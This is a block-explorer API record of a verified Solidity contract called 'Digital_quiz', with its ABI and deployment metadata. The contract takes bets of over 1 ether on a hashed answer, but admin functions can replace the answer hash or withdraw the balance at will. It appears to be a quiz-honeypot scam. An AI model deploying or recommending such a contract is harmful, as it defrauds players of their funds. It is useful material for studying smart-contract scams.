{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\ncontract Digital_quiz\r\n{\r\n    function Try(string _response) external payable \r\n    {\r\n        require(msg.sender == tx.origin);\r\n\r\n        if(responseHash == keccak256(_response) && msg.value > 1 ether)\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n\r\n    string public question;\r\n\r\n    bytes32 responseHash;\r\n\r\n    mapping (bytes32=>bool) admin;\r\n\r\n    function Start(string _question, string _response) public payable isAdmin{\r\n        if(responseHash==0x0){\r\n            responseHash = keccak256(_response);\r\n            question = _question;\r\n        }\r\n    }\r\n\r\n    function Stop() public payable isAdmin {\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n\r\n    function New(string _question, bytes32 _responseHash) public payable isAdmin {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] admins) public{\r\n        for(uint256 i=0; i< admins.length; i++){\r\n            admin[admins[i]] = true;        \r\n        }       \r\n    }\r\n\r\n    modifier isAdmin(){\r\n        require(admin[keccak256(msg.sender)]);\r\n        _;\r\n    }\r\n\r\n    function() public payable{}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_question\",\"type\":\"string\"},{\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Start\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_question\",\"type\":\"string\"},{\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"New\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"admins\",\"type\":\"bytes32[]\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Digital_quiz","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003373aa1011b31b4026056b211aff29e9a1ffce9343d3a4b4dcab60ff9ad35e12fac875aefd920eb697e291f9414a2103c99426ce8ef319508f7fb321d71e92e858f59c0eee0b6ed0c521c2609770180e5d7de0e1de3a415621ca6ba99c914400e","Library":"","LicenseType":"MIT","SwarmSource":"bzzr://5fec5bd84ea97d82a94219c968642f66501979c0b9d58e99afc9cc00bf1a0d8d"}]}